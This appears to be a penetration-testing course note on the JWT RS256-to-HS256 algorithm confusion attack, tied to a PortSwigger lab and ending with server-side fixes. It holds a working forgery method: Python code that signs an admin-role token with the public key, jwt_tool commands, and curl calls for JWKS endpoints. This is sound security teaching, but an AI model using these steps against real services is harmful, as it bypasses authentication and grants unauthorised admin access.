---
tags: [vapt, jwt, intermediate]
difficulty: intermediate
module: "18 - JWT"
topic: "18.05 RS256 to HS256 Algorithm Confusion"
portswigger_labs: ["JWT authentication bypass via algorithm confusion"]
---

# 18.05 — RS256 to HS256 Algorithm Confusion

## The Attack Concept

```
NORMAL RS256 FLOW:
  Server signs JWT with: PRIVATE KEY (kept secret!)
  Anyone verifies with: PUBLIC KEY (published openly)
  
  Public key is meant to be shared → safe to expose
  
THE CONFUSION ATTACK:
  If server allows BOTH RS256 and HS256:
  
  Attacker changes algorithm: RS256 → HS256
  
  Server for HS256 verification: verify(data, signature, secret_key)
  What "secret_key" does it use? The PUBLIC KEY!
  
  Why? The server has a function like:
  def verify(token, key):
      alg = token.header['alg']
      if alg == 'RS256':
          verify_rsa(token, public_key)
      elif alg == 'HS256':
          verify_hmac(token, key)  ← 'key' here might be the public_key!
  
  Attacker signs JWT with HS256 using the PUBLIC KEY as the HMAC secret
  Server verifies HS256 using the PUBLIC KEY as HMAC secret
  → MATCH! → Server accepts the forged token!
```

---

## Attack Steps

```
STEP 1: Find the server's public key
  Options:
  a) /.well-known/jwks.json → standard endpoint
  b) /api/jwks or /auth/keys
  c) Look in Burp responses for "n" and "e" (RSA key components)
  d) Exposed in source code / GitHub
  e) Extracted from existing JWT (if embedded as jwk header)

STEP 2: Convert public key to PEM format
  If you have JWKS JSON: use a converter tool
  
  Online: mkjwk.org or jwt.io
  Python: use cryptography library
  
  python3 -c "
  from cryptography.hazmat.primitives import serialization
  from cryptography.hazmat.backends import default_backend
  import json, base64, struct
  
  # From JWKS:
  jwks = {'n': '...', 'e': 'AQAB', 'kty': 'RSA'}
  # Convert to PEM using jwcrypto or python-jose
  "

STEP 3: Forge HS256 JWT using public key as secret
  python3 jwt_tool.py TOKEN -S hs256 -k public_key.pem
  
  OR manually:
  import hmac, hashlib, base64, json
  
  header = base64url('{"alg":"HS256","typ":"JWT"}')
  payload = base64url('{"role":"admin","userId":1}')
  data = f"{header}.{payload}"
  
  with open('public_key.pem', 'rb') as f:
      pubkey_bytes = f.read()
  
  sig = hmac.new(pubkey_bytes, data.encode(), hashlib.sha256).digest()
  signature = base64url(sig)
  forged = f"{data}.{signature}"

STEP 4: Send forged HS256 token
  → If server verifies HS256 with public key → MATCH → accepted!
```

---

## Using jwt_tool

```bash
# STEP 1: Get the public key (check /jwks.json):
curl https://target.com/.well-known/jwks.json
# OR:
curl https://target.com/auth/keys

# STEP 2: Save the PEM key (convert from JWKS if needed)
# jwt_tool can sometimes extract from live endpoint:
python3 jwt_tool.py TOKEN -jw https://target.com/.well-known/jwks.json

# STEP 3: Algorithm confusion attack:
python3 jwt_tool.py TOKEN -X k -pk public_key.pem
# -X k = exploit algorithm confusion with key
# -pk = public key file

# STEP 4: Also tamper payload:
python3 jwt_tool.py TOKEN -X k -pk public_key.pem -T
# -T = tamper mode (change claims interactively)
```

---

## Finding JWKS Endpoints

```bash
# COMMON JWKS ENDPOINTS:
curl https://target.com/.well-known/jwks.json
curl https://target.com/.well-known/openid-configuration  # → contains jwks_uri
curl https://target.com/api/.well-known/jwks.json
curl https://target.com/auth/.well-known/jwks.json
curl https://target.com/oauth2/v1/certs

# EXTRACT FROM JWT (if jwk embedded in header):
python3 jwt_tool.py TOKEN --decode
# jwt_tool shows jwk/jku if present in header

# GOOGLE EXAMPLE:
curl https://www.googleapis.com/oauth2/v3/certs
# → Returns active Google signing public keys in JWKS format
```

---

## Fix

```
DEFENSES:
  ✓ NEVER allow server to determine algorithm from the JWT header
    Algorithm must be hardcoded server-side!
    
  # WRONG (vulnerable):
  alg = jwt_header['alg']  # Attacker controls this!
  key = get_key_for_alg(alg)  # Picks public key for both!
  verify(token, key, alg)
  
  # RIGHT:
  EXPECTED_ALG = 'RS256'  # Hardcoded!
  EXPECTED_KEY = PRIVATE_PUBLIC_KEY  # The RSA public key
  verify(token, EXPECTED_KEY, algorithms=[EXPECTED_ALG])
  # → alg=HS256 from attacker rejected! Only RS256 accepted!
  
  ✓ Use separate key types for each algorithm:
    Don't use the same key object for both HMAC and RSA verification
    
  ✓ Strict algorithm whitelisting in verification code
```

---

## Related Notes
- [[04 - Algorithm None Attack]] — simpler algorithm attack
- [[07 - JWT Header Injection jwk claim]] — another key injection path
- [[08 - JWT Header Injection jku claim]] — remote key fetch attack
- [[18 - Defense Strong Algorithms Validation Short Expiry]] — fix
